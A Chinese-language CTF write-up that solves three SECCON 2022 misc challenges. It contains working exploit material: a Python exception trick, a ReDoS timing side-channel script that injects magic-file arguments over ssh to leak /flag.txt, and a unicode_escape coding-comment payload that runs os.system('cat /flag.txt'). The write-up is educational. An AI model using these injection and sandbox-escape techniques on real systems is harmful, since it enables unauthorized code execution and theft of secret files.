---
comment: True
---

# SECCON CTF 2022 Quals Writeup

!!! abstract
    隔了几年后第一次有日本线下决赛的 SECCON，队里决定好好打一下，预选赛 24 小时，最后勉强压线进了决赛。

    misc 题比较坐牢，大概就是源码很简单，但是就是很难想出来做法。而且有那么一丝 hackergame 的味道。

    在队友帮助下还是差了一道 AK，不过那一道后来在 discord 看到了别人分享的 payload，其实解法也不难的，可惜了……

    noiseccon 那题我基本没参与，没细看，就不写了。

---

## find flag
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

??? question "题目源码"
    ```python
    #!/usr/bin/env python3.9
    import os

    FLAG = os.getenv("FLAG", "FAKECON{*** REDUCTED ***}").encode()

    def check():
        try:
            filename = input("filename: ")
            if open(filename, "rb").read(len(FLAG)) == FLAG:
                return True
        except FileNotFoundError:
            print("[-] missing")
        except IsADirectoryError:
            print("[-] seems wrong")
        except PermissionError:
            print("[-] not mine")
        except OSError:
            print("[-] hurting my eyes")
        except KeyboardInterrupt:
            print("[-] gone")
        return False

    if __name__ == '__main__':
        try:
            check = check()
        except:
            print("[-] something went wrong")
            exit(1)
        finally:
            if check:
                print("[+] congrats!")
                print(FLAG.decode())
    ```

源码不长，就是输入一个文件名，然后它会读取，如果开头就是 flag，那么就输出 flag。

刚开始的时候我们就以为是要找这样的一个文件。测试了好多，反正是 /proc/1/environ 和 /proc/self/environ 里是有 flag 的，但是它不在开头。所以想要找办法让 open 读取的时候自带偏移。翻了源码也搞不懂。

然后是在一次本地测试的时候，添加的额外命令偶然触发了编码错误，但是却弹出了 flag，同时附带的还有 "[-] something went wrong"。

这才想起来 python 的 try-except-finally 语句是无论如何都会执行 finally，而且如果 check 函数中间产生了其它没有被捕获的异常的话就会退出，然后这个异常被 main 里的 except 捕获。虽然 exit(1) 了，但是并不会退出程序，而是会进入到 finally 块中。而且此时由于 check 函数被中断了，所以 check 变量名没有被重新赋值，它保留的仍然是这个函数，所以 if check 自然就成立了。

所以这是一道纯的 python 语言特性题，最终目标就是要在 check 函数的 try 块中触发除了 FileNotFoundError、IsADirectoryError、PermissionError、OSError、KeyboardInterrupt 之外的异常。可以直接在输入的时候按下 Ctrl-D，这会发送一个 EOF，造成 input 的 EOFError；也可以输入一个 \x00\n 之类的，让 open 函数抛出 ValueError。然后就会依次进入 except 和 finally 块并输出 flag 了。

flag: **SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}**

---

## txtchecker
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

很坐牢但很有意思的一道题。题目代码主体就只有：
```shell
#!/bin/bash
read -p "Input a file path: " filepath
file $filepath 2>/dev/null | grep -q "ASCII text" 2>/dev/null
exit 0
```
会通过 ssh ForceCommand 强制每次连接执行这个脚本。flag 存放在 /flag.txt 中。

这个脚本可控的只有 file 命令的参数，而且其 stdin 会通过管道传给后面的 grep，grep 使用了 -q 也就是 --quiet，不输出任何信息。而且两条指令的 stderr 都被重定向到了黑洞中。并且不论结果如何都会 exit 0。所以就是一个无任何回显、无返回值的脚本。

所以思路也就只有两个，一个是绕过，然后 getshell，但是试了一下不太可行，而且所有队伍都连接同一个机器，如果是这样的话恐怕早就被打烂了。另一个思路就是侧信道。

翻了 [file 的 man page](https://www.man7.org/linux/man-pages/man1/file.1.html)，其中有一个 -m 参数可以指定 magic 文件，这个 magic 文件是用来判断文件类型的，它也有 [man page](https://man7.org/linux/man-pages/man4/magic.4.html)，里面有相关的格式。除此之外也搜到了 file 源码中的自带 [magic file](https://github.com/file/file/tree/master/magic/Magdir) 以及一个第三方 magic file 的 repo [:material-github: lindenb/magic](https://github.com/lindenb/magic)。

-m 参数只能指定 magic file 文件，而我们想要的肯定是不存在服务器上的。所以要从标准输入读取，试了一下 -m /dev/stdin 是可以的，比如输入 `/flag -m /dev/stdin`，然后就会要求输入 magic file 内容，用 Ctrl-D 结束。按照上面的一些格式，尝试使用最方便的 regex，本地调试：
```text
$ echo "/flag.txt -m /dev/stdin\n0 regex .* flag" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022
Pseudo-terminal will not be allocated because stdin is not a terminal.
ctf@localhost's password:
/flag.txt: flag, ASCII text
$ echo "/flag.txt -m /dev/stdin\n0 regex .* %s" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022
Pseudo-terminal will not be allocated because stdin is not a terminal.
ctf@localhost's password:
/flag.txt: SECCON{dummy}, ASCII text
```
所以其实如果有回显的话就能直接泄露出 flag 了。但是现在这样只能通过侧信道，可以通过时间长短来判别。既然是通过正则匹配，那么我们理论就可以通过让匹配和不匹配时间产生差别，然后逐字符 leak 出 flag。

然后就搜了搜 ReDoS，看不太懂（之后有时间补一补），但是感觉在这里都不太可用，然后四老师给了一个 `(.?){0, 1000}` 这个正则是可以卡住的。

再看 magic 的格式，对于一个文件类型可以有多次匹配，其层级通过 > 来表示。例如：
```magic
0 regex pattern1
>0x18 regex pattern2 type1
>0x18 regex pattern3 type2
>>0x...
```
其是一个类似树状的结构，前面的不成立的话，下一层就不会继续匹配。所以可以在第一层判断是否匹配 flag，在第二层通过前面的正则来卡住，这样匹配上的话时间就会拖慢，而每匹配上的就会较快一点。所以设计的 magic file payload 就是：
```magic
0 regex SECCON\\{%s(.)+\\} aaa
>0 regex (.?){0, 1000} a
```
然后写一个程序逐字符尝试，然后取时间最长的一个填入 flag 并继续，就可以一点一点 leak 出 flag。
???+ success "exp"
    ```python
    s = 'echo "/flag.txt -m /dev/stdin\n0 regex SECCON\\\\\\\\{%s(.)+\\\\\\\\} aaa\n>0 regex (.?){0,1000} a" | sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022'

    import os, time, string
    import subprocess

    flag = ""

    for rd in range(10):
        res, best = None, None
        for i in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_$":
            print(i, end = " ")
            st = time.time()
            subprocess.run(s % (flag + i), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            t = time.time() - st
            print(t)
            if (res is None) or t > best:
                res = i
                best = t
        flag = flag + res
        print(f"SECCON{{{flag}")
    ```
    
找队友要了一个日本的延迟小的服务器，跑了一下，得到 flag: **SECCON{reDo5L1fe}**

---

## latexipy
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

??? question "题目主体代码"
    ```python
    import sys
    import ast
    import re
    import tempfile
    from importlib import util


    def get_fn_name(source: str) -> str | None:
        root = ast.parse(source)
        if type(root) is not ast.Module:
            return None
        if len(root.body) != 1:
            return None

        fn = root.body[0]
        if type(fn) is not ast.FunctionDef:
            return None

        fn.body.clear()
        if not re.fullmatch(r"def \w+\((\w+(, \w+)*)?\):", ast.unparse(fn)):
            # You must define a function without decorators, type annotations, and so on.
            return None

        return str(fn.name)


    print("""
    Latexify as a Service!

    E.g.
    ```
    def solve(a, b, c):
        return (-b + math.sqrt(b**2 - 4*a*c)) / (2*a)
    ```
    ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb

    Input your function (the last line must start with __EOF__):
    """.strip(), flush=True)

    source = ""
    while True:
        line = sys.stdin.readline()
        if line.startswith("__EOF__"):
            break
        source += line

    name = get_fn_name(source)
    if name is None:
        print("Invalid source")
        exit(1)

    source += f"""
    import latexify
    __builtins__["print"](latexify.get_latex({name}))
    """

    with tempfile.NamedTemporaryFile(suffix=".py") as file:
        file.write(source.encode())
        file.flush()

        print()
        print("Result:")
        spec = util.spec_from_file_location("tmp", file.name)
        spec.loader.exec_module(util.module_from_spec(spec))
    ```

反正就是输入一个函数（只能是单独一个函数，不能有装饰器、类型注解等），然后拼接起来得到一个临时代码文件，然后运行。效果就是利用 v0.1.1 版本的 latexify 来讲这个函数转换为 LaTeX 语法的表示。flag 在 /flag.txt，要试图读取它。

翻了 latexify 的源码，v0.1.1 的代码很简单，主要就是 core.py 一个文件里遍历了一遍 ast 树。没有任何 eval 之类的、也没有任何调用部件的地方。题目也限制的很死，也没有调用的地方。唯一可能利用的是提供一个 print 函数试图在打印结果的时候调用，但是它又用的是 \_\_builtins\_\_["print"] 防止了这一行为。

想了很多、试了很多、也翻了源码，没做出来。

赛后看了 discord 上别人分享的 payload，很简单，改了一下就是：
```python
# coding: unicode_escape
def exp():
    return "\u0022\u000a__import__('os').system('cat /flag.txt')\u000a\u0022"
__EOF__
```
这个原理也很简单。就是在 get_fn_name 进行检查的时候是直接对输入进行 ast 解析然后检查语法树的，这时注释会被忽略，return 的字符串是完整的，所以一切检查都可以通过。

而当运行的时候是将其写入文件然后运行文件的。我们的输入在开头，第一行的注释就指定了文件编码为 unicode_escape，所以在运行的时候解码得到的就相当于：
```python
# coding: unicode_escape
def exp()
    return ""
__import__('os').system('cat /flag.txt')
""
import latexify
__builtins__["print"](latexify.get_latex({name}))
```
所以在执行的时候就会 cat flag 了: **SECCON{UTF7_is_hack3r_friend1y_encoding}**